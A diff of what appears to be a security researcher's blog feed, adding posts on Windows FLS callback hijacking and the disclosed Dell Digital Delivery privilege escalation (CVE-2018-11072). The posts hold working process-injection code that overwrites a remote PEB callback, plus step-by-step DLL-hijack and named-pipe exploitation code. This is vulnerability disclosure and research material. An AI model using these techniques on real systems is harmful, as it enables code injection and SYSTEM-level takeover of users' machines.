+</pre></td><td class='code'><pre><code class=''><span class='line'>dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And fetching it (assuming again an index of 6):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:001&gt; dt _PEB 7ffd8000 FlsCallback
+</span><span class='line'>ucrtbased!_PEB
+</span><span class='line'>   +0x20c FlsCallback : 0x002d51f8 _FLS_CALLBACK_INFO
+</span><span class='line'>0:001&gt; dd 0x002d51f8 + (2 * 6 * 4) l1
+</span><span class='line'>002d5228  41414141</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What happens when we let this run to process exit?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:001&gt; g
+</span><span class='line'>(10a8.1328): Access violation - code c0000005 (first chance)
+</span><span class='line'>First chance exceptions are reported before any exception handling.
+</span><span class='line'>This exception may be expected and handled.
+</span><span class='line'>eax=41414141 ebx=7ffd8000 ecx=002da998 edx=002d522c esi=00000006 edi=002da028
+</span><span class='line'>eip=41414141 esp=0051f71c ebp=0051f734 iopl=0         nv up ei pl nz na po nc
+</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+</span><span class='line'>41414141 ??              ???</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Recall the MSDN comment about <em>when</em> the FLS callback is invoked: <code>..on fiber
+deletion, thread exit, and when an FLS index is freed</code>. This means that worst
+case our code executes once the process exits and best case following a
+threads exit or call to <code>FlsFree</code>. It&rsquo;s worth reiterating that the primary
+thread for each process will have a fiber instantiated already; it&rsquo;s quite
+possible that this thread isn&rsquo;t around anymore, but this doesn&rsquo;t matter as the
+callbacks are at the process level.</p>
+
+<p>Another salient point here is the first parameter to the callback function.
+This parameter is the value of whatever was in the indexed slot and is also
+stashed in ECX/RCX before invoking the callback:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
+</span><span class='line'>FlsSetValue(dwIdx, (PVOID)0x42424242);
+</span><span class='line'>DebugBreak();</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Which, when executed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(aa8.169c): Access violation - code c0000005 (first chance)
+</span><span class='line'>First chance exceptions are reported before any exception handling.
+</span><span class='line'>This exception may be expected and handled.
+</span><span class='line'>eax=41414141 ebx=7ffd9000 ecx=42424242 edx=003c522c esi=00000006 edi=003ca028
+</span><span class='line'>eip=41414141 esp=006ef9c0 ebp=006ef9d8 iopl=0         nv up ei pl nz na pe nc
+</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+</span><span class='line'>41414141 ??              ???</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Under specific circumstances, this can be quite useful.</p>
+
+<p>Anyway, PoC||GTFO, I&rsquo;ve included some code below. In it, we overwrite the
+<code>msvcrt!_freefls</code> call used to free the FLS buffer.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#ifdef _WIN64
+</span><span class='line'>#define FlsCallbackOffset 0x320
+</span><span class='line'>#else
+</span><span class='line'>#define FlsCallbackOffset 0x20c
+</span><span class='line'>#endif
+</span><span class='line'>
+</span><span class='line'>void OverwriteFlsCallback(LPVOID dwNewAddr, HANDLE hProcess) 
+</span><span class='line'>{
+</span><span class='line'>    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll"), 
+</span><span class='line'>                                                            "NtQueryInformationProcess");
+</span><span class='line'>    const char *payload = "\xcc\xcc\xcc\xcc";
+</span><span class='line'>    PROCESS_BASIC_INFORMATION pbi;
+</span><span class='line'>    SIZE_T sCallback = 0, sRetLen = 0;
+</span><span class='line'>    LPVOID lpBuf = NULL;
+</span><span class='line'>
+</span><span class='line'>    //
+</span><span class='line'>    // allocate memory and write in our payload as one would normally do
+</span><span class='line'>    //
+</span><span class='line'>
+</span><span class='line'>    lpBuf = VirtualAllocEx(hProcess, NULL, sizeof(SIZE_T), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span><span class='line'>    WriteProcessMemory(hProcess, lpBuf, payload, sizeof(SIZE_T), NULL);
+</span><span class='line'>
+</span><span class='line'>    // now we need to fetch the remote process PEB
+</span><span class='line'>    NtQueryInformationProcess(hProcess, PROCESSINFOCLASS(0), &pbi,
+</span><span class='line'>                              sizeof(PROCESS_BASIC_INFORMATION), NULL);
+</span><span class='line'>
+</span><span class='line'>    // read the FlsCallback address out of it
+</span><span class='line'>    ReadProcessMemory(hProcess, (LPVOID)(((SIZE_T)pbi.PebBaseAddress) + FlsCallbackOffset), 
+</span><span class='line'>                          (LPVOID)&sCallback, sizeof(SIZE_T), &sRetLen);
+</span><span class='line'>    sCallback += 2 * sizeof(SIZE_T);
+</span><span class='line'>
+</span><span class='line'>    // we're targeting the _freefls call, so overwrite that with our payload
+</span><span class='line'>    // address 
+</span><span class='line'>    WriteProcessMemory(hProcess, (LPVOID)sCallback, &dwNewAddr, sizeof(SIZE_T), &sRetLen);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tested this on an updated Windows 10 x64 against notepad and mspaint; on
+process exit, the callback is executed and we gain control over execution flow.
+Pretty useful in the end; more on this soon&hellip;</p>
+
+<h2>References</h2>
+
+<p>[0] <a href="http://www.hexacorn.com">http://www.hexacorn.com</a> <br/>
+[1] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers">https://docs.microsoft.com/en-us/windows/win32/procthread/fibers</a> <br/>
+[2] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage">https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage</a> <br/>
+[3] <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function">https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation]]></title>
+    <link href="http://hatRiot.github.io/blog/2018/08/22/dell-digital-delivery-eop/"/>
+    <updated>2018-08-22T14:10:04-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2018/08/22/dell-digital-delivery-eop</id>
+    <content type="html"><![CDATA[<p>Back in March or April I began reversing a slew of Dell applications installed
+on a laptop I had. Many of them had privileged services or processes running
+and seemed to perform a lot of different complex actions. I previously
+disclosed a LPE in SupportAssist[0], and identified another in their Digital
+Delivery platform. This post will detail a Digital Delivery vulnerability and
+how it can be exploited. This was privately discovered and disclosed, and no
+known active exploits are in the wild. Dell has issued a security advisory for
+this issue, which can be found here[4].</p>
+
+<p>I&rsquo;ll have another follow-up post detailing the internals of this application
+and a few others to provide any future researchers with a starting point.
+Both applications are rather complex and expose a large attack surface.
+If you&rsquo;re interested in bug hunting LPEs in large C#/C++ applications, it&rsquo;s
+a fine place to begin.</p>
+
+<p>Dell&rsquo;s Digital Delivery[1] is a platform for buying and installing system
+software. It allows users to purchase or manage software packages and reinstall
+them as necessary. Once again, it comes &ldquo;..preinstalled on most Dell
+systems.&rdquo;[1]</p>
+
+<h2>Bug</h2>
+
+<p>The Digital Delivery service runs as SYSTEM under the name DeliveryService,
+which runs the DeliveryService.exe binary. A userland binary, DeliveryTray.exe,
+is the user-facing component that allows users to view installed applications
+or reinstall previously purchased ones.</p>
+
+<p>Communication from DeliveryTray to DeliveryService is performed via a
+Windows Communication Foundation (WCF) named pipe. If you&rsquo;re unfamiliar with
+WCF, it&rsquo;s essentially a standard methodology for exchanging data between two
+endpoints[2]. It allows a service to register a processing endpoint and expose
+functionality, similar to a web server with a REST API.</p>
+
+<p>For those following along at home, you can find the initialization of the WCF
+pipe in <code>Dell.ClientFulfillmentService.Controller.Initialize</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>this._host = WcfServiceUtil.StandupServiceHost(typeof(UiWcfSession),
+</span><span class='line'>                                typeof(IClientFulfillmentPipeService),
+</span><span class='line'>                                "DDDService");</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This invokes <code>Dell.NamedPipe.StandupServiceHost</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ServiceHost host = null;
+</span><span class='line'>string apiUrl = "net.pipe://localhost/DDDService/IClientFulfillmentPipeService";
+</span><span class='line'>Uri realUri = new Uri("net.pipe://localhost/" + Guid.NewGuid().ToString());
+</span><span class='line'>Tryblock.Run(delegate
+</span><span class='line'>{
+</span><span class='line'>  host = new ServiceHost(classType, new Uri[]
+</span><span class='line'>  {
+</span><span class='line'>    realUri
+</span><span class='line'>  });
+</span><span class='line'>  host.AddServiceEndpoint(interfaceType, WcfServiceUtil.CreateDefaultBinding(), string.Empty);
+</span><span class='line'>  host.Open();
+</span><span class='line'>}, null, null);
+</span><span class='line'>AuthenticationManager.Singleton.RegisterEndpoint(apiUrl, realUri.AbsoluteUri);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The endpoint is thus registered and listening and the AuthenticationManager
+singleton is responsible for handling requests. Once a request comes in, the
+AuthenticationManager passes this off to the AuthPipeWorker function which,
+among other things, performs the following authentication:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>string execuableByProcessId = AuthenticationManager.GetExecuableByProcessId(processId);
+</span><span class='line'>bool flag2 = !FileUtils.IsSignedByDell(execuableByProcessId);
+</span><span class='line'>if (!flag2)
+</span><span class='line'>{
+</span><span class='line'>    ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If the process on the other end of the request is backed by a signed Dell
+binary, the request is allowed and a connection may be established. If not, the
+request is denied.</p>
+
+<p>I noticed that this is new behavior, added sometime between 3.1 (my original
+testing) and 3.5 (latest version at the time, 3.5.1001.0), so I assume Dell is
+aware of this as a potential attack vector. Unfortunately, this is an
+inadequate mitigation to sufficiently protect the endpoint. I was able to get
+around this by simply spawning an executable signed by Dell (DeliveryTray.exe,
+for example) and injecting code into it. Once code is injected, the WCF API
+exposed by the privileged service is accessible.</p>
+
+<p>The endpoint service itself is implemented by <code>Dell.NamedPipe</code>, and exposes a
+dozen or so different functions. Those include:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ArchiveAndResetSettings
+</span><span class='line'>EnableEntitlements
+</span><span class='line'>EnableEntitlementsAsync
+</span><span class='line'>GetAppSetting
+</span><span class='line'>PingTrayApp
+</span><span class='line'>PollEntitlementService
+</span><span class='line'>RebootMachine
+</span><span class='line'>ReInstallEntitlement
+</span><span class='line'>ResumeAllOperations
+</span><span class='line'>SetAppSetting
+</span><span class='line'>SetAppState
+</span><span class='line'>SetEntitlementList
+</span><span class='line'>SetUserDownloadChoice
+</span><span class='line'>SetWallpaper
+</span><span class='line'>ShowBalloonTip
+</span><span class='line'>ShutDownApp
+</span><span class='line'>UpdateEntitlementUiState</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Digital Delivery calls application install packages &ldquo;entitlements&rdquo;, so the
+references to installation/reinstallation are specific to those packages either
+available or presently installed.</p>
+
+<p>One of the first functions I investigated was <code>ReInstallEntitlement</code>, which
+allows one to initiate a reinstallation process of an installed entitlement.
+This code performs the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>private static void ReInstallEntitlementThreadStart(object reInstallArgs)
+</span><span class='line'>{
+</span><span class='line'>    PipeServiceClient.ReInstallArgs ra = (PipeServiceClient.ReInstallArgs)reInstallArgs;
+</span><span class='line'>    PipeServiceClient.TryWcfCall(delegate
+</span><span class='line'>    {
+</span><span class='line'>        PipeServiceClient._commChannel.ReInstall(ra.EntitlementId, ra.RunAsUser);
+</span><span class='line'>    }, string.Concat(new object[]
+</span><span class='line'>    {
+</span><span class='line'>        "ReInstall ",
+</span><span class='line'>        ra.EntitlementId,
+</span><span class='line'>        " ",
+</span><span class='line'>        ra.RunAsUser.ToString()
+</span><span class='line'>    }));
+</span><span class='line'>}
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This builds the arguments from the request and invokes a WCF call, which is
+sent to the WCF endpoint. The <code>ReInstallEntitlement</code> call takes two arguments:
+an entitlement ID and a RunAsUser flag. These are both controlled by the
+caller.</p>
+
+<p>On the server side, <code>Dell.ClientFulfillmentService.Controller</code> handles
+implementation of these functions, and  <code>OnReInstall</code> handles the entitlement
+reinstallation process. It does a couple sanity checks, validates the package
+signature, and hits the <code>InstallationManager</code> to queue the install request. The
+<code>InstallationManager</code> has a job queue and background thread (<code>WorkingThread</code>)
+that occasionally polls for new jobs and, when it receives the install job,
+kicks off <code>InstallSoftware</code>.</p>
+
+<p>Because we&rsquo;re reinstalling an entitlement, the package is cached to disk and
+ready to be installed. I&rsquo;m going to gloss over a few installation steps
+here because it&rsquo;s frankly standard and menial.</p>
+
+<p>The installation packages are located in
+<code>C:\ProgramData\Dell\DigitalDelivery\Downloads\Software\</code> and are first
+unzipped, followed by an installation of the software. In my case, I was
+triggering the installation of <code>Dell Data Protection - Security Tools v1.9.1</code>,
+and if you follow along in procmon, you&rsquo;ll see it startup an install process:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>"C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _
+</span><span class='line'>Security Tools v1.9.1\STSetup.exe" -y -gm2 /S /z"\"CIRRUS_INSTALL,
+</span><span class='line'>SUPPRESSREBOOT=1\""</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The run user for this process is determined by the controllable RunAsUser flag
+and, if set to False, runs as <code>SYSTEM</code> out of the <code>%ProgramData%</code> directory.</p>
+
+<p>During process launch of the <code>STSetup</code> process, I noticed the following in
+procmon:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\VERSION.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\UxTheme.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\PROPSYS.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\apphelp.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\Secur32.dll
+</span><span class='line'>C:\ProgramData\Dell\Digital Delivery\Downloads\Software\Dell Data Protection _ Security Tools v1.9.1\api-ms-win-downlevel-advapi32-l2-1-0.dll</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Of interest here is that the parent directory, <code>%ProgramData%\Dell\Digital
+Delivery\Downloads\Software</code> is not writable by any system user, but the
+entitlement package folders, <code>Dell Data Protection - Security Tools</code> in this
+case, is.</p>
+
+<p>This allows non-privileged users to drop arbitrary files into this
+directory, granting us a DLL hijacking opportunity.</p>
+
+<h2>Exploitation</h2>
+
+<p>Exploiting this requires several steps:</p>
+
+<ol>
+<li>Drop a DLL under the appropriate <code>%ProgramData%</code> software package directory</li>
+<li>Launch a new process running an executable signed by Dell</li>
+<li>Inject C# into this process (which is running unprivileged in userland)</li>
+<li>Connect to the WCF named pipe from within the injected process</li>
+<li>Trigger ReInstallEntitlement</li>
+</ol>
+
+
+<p>Steps 4 and 5 can be performed using the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PipeServiceClient client = new PipeServiceClient();
+</span><span class='line'>client.Initialize();
+</span><span class='line'>
+</span><span class='line'>while (PipeServiceClient.AppState == AppState.Initializing)
+</span><span class='line'>  System.Threading.Thread.Sleep(1000);
+</span><span class='line'>
+</span><span class='line'>EntitlementUiWrapper entitle = PipeServiceClient.EntitlementList[0];
+</span><span class='line'>PipeServiceClient.ReInstallEntitlement(entitle.ID, false);
+</span><span class='line'>System.Threading.Thread.Sleep(30000);
+</span><span class='line'>
+</span><span class='line'>PipeServiceClient.CloseConnection();</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The classes used above are imported from <code>NamedPipe.dll</code>. Note that we&rsquo;re
+simply choosing the first entitlement available and reinstalling it. You may
+need to iterate over entitlements to identify the correct package pointing to
+where you dropped your DLL.</p>
+
+<p>I&rsquo;ve provided a PoC on my Github here[3], and Dell has additionally released
+a security advisory, which can be found here[4].</p>
+
+<h2>Timeline</h2>
+
+<p>05/24/18 &ndash; Vulnerability initially reported<br/>
+05/30/18 &ndash; Dell requests further information<br/>
+06/26/18 &ndash; Dell provides update on review and remediation<br/>
+07/06/18 &ndash; Dell provides internal tracking ID and update on progress<br/>
+07/24/18 &ndash; Update request<br/>
+07/30/18 &ndash; Dell confirms they will issue a security advisory and associated CVE<br/>
+08/07/18 &ndash; 90 day disclosure reminder provided<br/>
+08/10/18 &ndash; Dell confirms 8/22 disclosure date alignment<br/>
+08/22/18 &ndash; Public disclosure</p>
+
+<h2>References</h2>
+
+<p>[0] <a href="http://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">http://hatriot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/</a><br/>
+[1] <a href="https://www.dell.com/learn/us/en/04/flatcontentg/dell-digital-delivery">https://www.dell.com/learn/us/en/04/flatcontentg/dell-digital-delivery</a><br/>
+[2] <a href="https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf">https://docs.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf</a><br/>
+[3] <a href="https://github.com/hatRiot/bugs">https://github.com/hatRiot/bugs</a><br/>
+[4] <a href="https://www.dell.com/support/article/us/en/04/SLN313559">https://www.dell.com/support/article/us/en/04/SLN313559</a><br/></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Dell SupportAssist Driver - Local Privilege Escalation]]></title>
@@ -300,11 +2015,11 @@ lazy to work out), but is very stable.</p>
 
 <p>[0]
 <a href="http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist%0A">http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist
-</a>[1] <a href="http://blog.rewolf.pl/blog/?p=1630%0A">http://blog.rewolf.pl/blog/?p=1630
-</a>[2] <a href="https://www.exploit-db.com/exploits/39785/%0A">https://www.exploit-db.com/exploits/39785/
-</a>[3] <a href="http://www.pc-doctor.com/%0A">http://www.pc-doctor.com/
-</a>[4] <a href="https://github.com/rwfpl/rewolf-msi-exploit%0A">https://github.com/rwfpl/rewolf-msi-exploit
-</a>[5] <a href="https://github.com/hatRiot/token-priv%0A">https://github.com/hatRiot/token-priv
+</a>[1] <a href="http://blog.rewolf.pl/blog/?p=1630">http://blog.rewolf.pl/blog/?p=1630</a>
+[2] <a href="https://www.exploit-db.com/exploits/39785/">https://www.exploit-db.com/exploits/39785/</a>
+[3] <a href="http://www.pc-doctor.com/">http://www.pc-doctor.com/</a>
+[4] <a href="https://github.com/rwfpl/rewolf-msi-exploit">https://github.com/rwfpl/rewolf-msi-exploit</a>
+[5] <a href="https://github.com/hatRiot/token-priv%0A">https://github.com/hatRiot/token-priv
 </a>[6]
 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\</a></p>
 ]]></content>
@@ -865,6 +2580,22 @@ Note that it isn&rsquo;t production quality; beware, here be dragons.</p>
 [3] <a href="https://github.com/hatRiot/DelayLoadInject">https://github.com/hatRiot/DelayLoadInject</a>  <br/>
 [4]
 <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811">https://msdn.microsoft.com/en-us/library/windows/hardware/ff539811</a>(v=vs.85).aspx</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Abusing Token Privileges for EoP]]></title>
+    <link href="http://hatRiot.github.io/blog/2017/09/01/abusing-token-privileges-for-eop/"/>
+    <updated>2017-09-01T14:00:00-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2017/09/01/abusing-token-privileges-for-eop</id>
+    <content type="html"><![CDATA[<p>This is just a placeholder post to link off to Stephen Breen and I&rsquo;s paper on
+abusing token privileges. You can read the entire paper here[0]. I also
+recommend checking out the blogpost he posted on Foxglove here[1].</p>
+
+<h2></h2>
+
+<p>[0] <a href="https://raw.githubusercontent.com/hatRiot/token-priv/master/abusing_token_eop_1.0.txt">https://raw.githubusercontent.com/hatRiot/token-priv/master/abusing_token_eop_1.0.txt</a> <br/>
+[1] <a href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/">https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</a></p>
 ]]></content>
   </entry>
   
@@ -1588,1384 +3319,6 @@ Note that it isn&rsquo;t production quality; beware, here be dragons.</p>
 </span><span class='line'>        environ["LD_PRELOAD"] = ld_pl
 </span><span class='line'>        system("echo %s | ntpdc 2&gt;&1" % sploit)</span></code></pre></td></tr></table></div></figure>
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar solutions - Network]]></title>
-    <link href="http://hatRiot.github.io/blog/2014/11/23/protostar-network/"/>
-    <updated>2014-11-23T13:10:04-08:00</updated>
-    <id>http://hatRiot.github.io/blog/2014/11/23/protostar-network</id>
-    <content type="html"><![CDATA[<p>Previous posts:</p>
-
-<p><a href="http://hatriot.github.io/blog/2013/03/31/protostar-solutions-stack-levels/">Protostar &ndash; Stack</a><br/>
-<a href="http://hatriot.github.io/blog/2014/09/16/protostar-format-strings/">Protostar &ndash; Format String</a><br/>
-<a href="http://hatriot.github.io/blog/2014/09/21/protostar-heap-exploits/">Protostar &ndash; Heap</a></p>
-
-<p>The network stages were pretty simple and emphasized more on data representation, rather than remote exploitation.</p>
-
-<h2>Network 00</h2>
-
-<p>The network levels all have binaries running on the system on various ports.  The first level runs on port 2999.  We can attach to the process with gdb and send over some junk data:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># echo "xxxx" | nc 192.168.1.106 2999
-</span><span class='line'>Please send '652467094' as a little endian 32bit int
-</span><span class='line'>I'm sorry, you sent 2021161080 instead</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Looking at the <a href="https://exploit-exercises.com/protostar/net0/">source code</a>, we want to send a string that, when cast to an unsigned integer, equals some random value.  To do this, we simply open up a socket to the listener, read in the number, transform it to little endian, and send it back.  Using a bit of Python-fu we quickly arrive at a solution:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
-</span><span class='line'>import struct
-</span><span class='line'>import sys
-</span><span class='line'>from re import findall
-</span><span class='line'>
-</span><span class='line'>try:
-</span><span class='line'>    sock = socket.socket()
-</span><span class='line'>    sock.connect(('192.168.1.106', 2999))
-</span><span class='line'>
-</span><span class='line'>    data = sock.recv(256)
-</span><span class='line'>
-</span><span class='line'>    m = findall("Please send '(.*?)' as", data)
-</span><span class='line'>    if len(m) &gt; 0:
-</span><span class='line'>        m = int(m[0])
-</span><span class='line'>    else:
-</span><span class='line'>        print 'No data received?'
-</span><span class='line'>        sys.exit(1)
-</span><span class='line'>
-</span><span class='line'>    print 'Swapping %s to little endian 32bit int' % m
-</span><span class='line'>    swapped = struct.pack('&lt;Q', m)
-</span><span class='line'>
-</span><span class='line'>    print 'Swapped to %s' % repr(swapped)
-</span><span class='line'>    sock.sendall(str(swapped))
-</span><span class='line'>
-</span><span class='line'>    data = sock.recv(512)
-</span><span class='line'>    print data
-</span><span class='line'>except Exception, e:
